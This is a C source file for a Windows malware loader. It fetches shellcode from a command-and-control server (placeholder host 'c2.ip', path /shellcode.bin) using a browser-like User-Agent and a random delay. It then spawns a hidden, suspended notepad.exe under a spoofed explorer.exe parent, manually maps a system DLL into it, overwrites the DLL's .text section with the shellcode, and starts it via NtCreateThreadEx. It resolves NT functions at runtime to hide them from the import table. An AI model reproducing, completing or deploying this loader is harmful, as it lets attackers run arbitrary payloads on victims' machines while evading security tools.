#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <winhttp.h>
#include <winternl.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")


// Configuration for fetching shellcode
#define C2_HOST      L"c2.ip"
#define C2_PORT      8080
#define C2_PATH      L"/shellcode.bin"


// Choose which process should be spwned as decoy
#define DECOY_PROC   L"C:\\Windows\\System32\\notepad.exe"
#define STOMP_DLL    L"somedll.dll" // choose which dll to stomp 


typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE,
    PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

typedef NTSTATUS(NTAPI* NtWriteVirtualMemory_t)(
    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

// Resolve NT functions dynamically — avoids IAT exposure
NtCreateThreadEx_t      pNtCreateThreadEx = NULL;
NtWriteVirtualMemory_t  pNtWriteVirtualMemory = NULL;
NtProtectVirtualMemory_t pNtProtectVirtualMemory = NULL;
NtAllocateVirtualMemory_t pNtAllocateVirtualMemory = NULL;

void ResolveNtFunctions() {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    pNtCreateThreadEx = (NtCreateThreadEx_t)
        GetProcAddress(ntdll, "NtCreateThreadEx");
    pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)
        GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (NtProtectVirtualMemory_t)
        GetProcAddress(ntdll, "NtProtectVirtualMemory");
    pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)
        GetProcAddress(ntdll, "NtAllocateVirtualMemory");
}


DWORD GetTargetPID(const wchar_t* procName) {
    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    while (Process32NextW(snap, &pe))
        if (!_wcsicmp(pe.szExeFile, procName)) {
            CloseHandle(snap);
            return pe.th32ProcessID;
        }
    CloseHandle(snap);
    return 0;
}

PROCESS_INFORMATION SpawnSpoofed(const wchar_t* targetProc) {
    STARTUPINFOEXW si = {};
    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    SIZE_T attrSize = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)
        HeapAlloc(GetProcessHeap(), 0, attrSize);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);
    // Open explorer.exe as spoofed parent
    DWORD explorerPID = GetTargetPID(L"explorer.exe");
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, explorerPID);
    UpdateProcThreadAttribute(si.lpAttributeList, 0,
        PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);
    PROCESS_INFORMATION pi = {};
    wchar_t cmd[MAX_PATH];
    wcscpy_s(cmd, targetProc);
    CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
    CloseHandle(hParent);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
    return pi;
}


unsigned char* FetchPayload(SIZE_T* outLen) {
    

    Sleep(2000 + (rand() % 4000));

    HINTERNET hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        L"AppleWebKit/537.36 (KHTML, like Gecko) "
        L"Chrome/124.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        NULL, NULL, 0);

    HINTERNET hConnect = WinHttpConnect(hSession, C2_HOST, C2_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", C2_PATH,
        NULL, NULL, NULL, 0);

    WinHttpAddRequestHeaders(hRequest,
        L"Accept: text/html,application/xhtml+xml,*/*\r\n"
        L"Accept-Language: en-US,en;q=0.9\r\n"
        L"Cache-Control: no-cache\r\n",
        -1L, WINHTTP_ADDREQ_FLAG_ADD);

    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);

    unsigned char* buf = NULL;
    SIZE_T total = 0;
    DWORD read = 0;
    BYTE chunk[4096];

    while (WinHttpReadData(hRequest, chunk, sizeof(chunk), &read) && read > 0) {
        buf = (unsigned char*)realloc(buf, total + read);
        memcpy(buf + total, chunk, read);
        total += read;
    }

    *outLen = total;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return buf;
}


LPVOID ManualMapDLL(HANDLE hProc, const wchar_t* dllPath) {

    HANDLE hFile = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* localBuf = (BYTE*)HeapAlloc(GetProcessHeap(), 0, fileSize);
    DWORD bytesRead;
    ReadFile(hFile, localBuf, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);


    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)localBuf;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(localBuf + dos->e_lfanew);

    SIZE_T imageSize = nt->OptionalHeader.SizeOfImage;
    LPVOID remoteBase = NULL;


    pNtAllocateVirtualMemory(hProc, &remoteBase, 0, &imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


    SIZE_T written;
    pNtWriteVirtualMemory(hProc, remoteBase, localBuf,
        nt->OptionalHeader.SizeOfHeaders, &written);


    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sections[i].SizeOfRawData == 0) continue;
        LPVOID dest = (BYTE*)remoteBase + sections[i].VirtualAddress;
        BYTE* src = localBuf + sections[i].PointerToRawData;
        pNtWriteVirtualMemory(hProc, dest, src,
            sections[i].SizeOfRawData, &written);
    }

    HeapFree(GetProcessHeap(), 0, localBuf);
    return remoteBase;
}


LPVOID StompTextSection(HANDLE hProc, LPVOID remoteBase,
    unsigned char* shellcode, SIZE_T scLen) {
    IMAGE_DOS_HEADER dos = {};
    IMAGE_NT_HEADERS nt = {};
    SIZE_T read;

    ReadProcessMemory(hProc, remoteBase, &dos, sizeof(dos), &read);
    ReadProcessMemory(hProc, (BYTE*)remoteBase + dos.e_lfanew,
        &nt, sizeof(nt), &read);

    IMAGE_SECTION_HEADER sec = {};
    LPVOID sectionTable = (BYTE*)remoteBase + dos.e_lfanew
        + sizeof(IMAGE_NT_HEADERS);

    LPVOID textBase = NULL;
    for (int i = 0; i < nt.FileHeader.NumberOfSections; i++) {
        ReadProcessMemory(hProc,
            (BYTE*)sectionTable + i * sizeof(IMAGE_SECTION_HEADER),
            &sec, sizeof(sec), &read);
        if (memcmp(sec.Name, ".text", 5) == 0) {
            textBase = (BYTE*)remoteBase + sec.VirtualAddress;
            break;
        }
    }

    if (!textBase) return NULL;

    PVOID  protBase = textBase;
    SIZE_T protSize = scLen;
    ULONG  oldProt = 0;

    pNtProtectVirtualMemory(hProc, &protBase, &protSize,
        PAGE_READWRITE, &oldProt);
    pNtWriteVirtualMemory(hProc, textBase, shellcode, scLen, &read);

    pNtProtectVirtualMemory(hProc, &protBase, &protSize,
        PAGE_EXECUTE_READ, &oldProt);

    return textBase;
}


void ExecuteInRemote(HANDLE hProc, LPVOID startAddr) {
    HANDLE hThread = NULL;
    pNtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProc,
        startAddr,
        NULL,
        FALSE,      
        0, 0, 0,
        NULL);
    if (hThread) CloseHandle(hThread);
}


int main() {
    printf("[LOADER] Starting...\n");

    ResolveNtFunctions();


    SIZE_T scLen = 0;
    unsigned char* shellcode = FetchPayload(&scLen);
    if (!shellcode || scLen == 0) {
        printf("[LOADER] FAIL: Could not fetch shellcode from C2\n");
        return 1;
    }
    printf("[LOADER] [+] Shellcode fetched (%zu bytes)\n", scLen);

    PROCESS_INFORMATION pi = SpawnSpoofed(DECOY_PROC);
    if (!pi.hProcess) {
        printf("[LOADER] FAIL: Could not spawn decoy process (%ls)\n", DECOY_PROC);
        return 1;
    }
    printf("[LOADER] [+] Decoy process spawned (PID: %d)\n", pi.dwProcessId);

    wchar_t fullDllPath[MAX_PATH];
    swprintf_s(fullDllPath, L"C:\\Windows\\System32\\%s", STOMP_DLL);
    LPVOID remoteBase = ManualMapDLL(pi.hProcess, fullDllPath);
    if (!remoteBase) {
        printf("[LOADER] FAIL: ManualMapDLL failed (DLL: %ls)\n", fullDllPath);
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("[LOADER] [+] DLL mapped: %ls\n", STOMP_DLL);

    LPVOID execAddr = StompTextSection(pi.hProcess, remoteBase, shellcode, scLen);
    if (!execAddr) {
        printf("[LOADER] FAIL: StompTextSection failed\n");
        TerminateProcess(pi.hProcess, 0);
        return 1;
    }
    printf("[LOADER] [+] Shellcode injected into .text section\n");


    ResumeThread(pi.hThread);
    ExecuteInRemote(pi.hProcess, execAddr);
    printf("[LOADER] [+] Execution started via NtCreateThreadEx\n");


    SecureZeroMemory(shellcode, scLen);
    free(shellcode);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    printf("[LOADER] Finished successfully.\n");
    return 0;
}
